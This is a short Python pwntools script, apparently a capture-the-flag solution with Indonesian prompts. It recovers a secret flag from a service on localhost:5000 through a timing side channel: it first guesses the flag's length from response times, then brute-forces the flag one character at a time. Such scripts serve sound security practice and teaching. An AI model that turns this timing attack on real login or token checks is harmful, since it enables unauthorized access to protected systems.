from pwn import *
import time


context.log_level = 'error'


def cari_panjang(maximal):
	print("[+] Mencari Panjang Flag")
	panjang = []
	for i in range(0,maximal):
		t0= time.time()
		r = remote('localhost', 5000)
		r.recvuntil('Masukan Flagnya : ')
		payload = 'A' * i
		r.sendline(payload)
		r.recv()
		t1 = time.time() - t0
		panjang.append(t1)
		r.close()
	terlama = panjang.index(max(panjang))
	print("Kemungkinan panjang flag : {} waktu eksekusi {}".format(str(terlama), str(max(panjang))))
	return terlama

panjang_flag = cari_panjang(50)
payload = 'A' * panjang_flag
flag = 'CTFR'
karaketer = 'abcdefghijklmnopqrstuvwxyz1234567890_{}'

print("[+] Mencari Flag....")

while(True):
	if len(flag) >= panjang_flag:
		break

	panjang = []
	for x in karaketer:
		t0= time.time()
		r = remote('localhost', 5000)
		r.recvuntil('Masukan Flagnya : ')
		payload = flag + x + payload[len(flag)+1:]
		r.sendline(payload)
		r.recv()
		t1 = time.time() - t0
		panjang.append(t1)
		r.close()
		context.clear()
	terlama = panjang.index(max(panjang))
	flag+=karaketer[terlama]
	print(flag)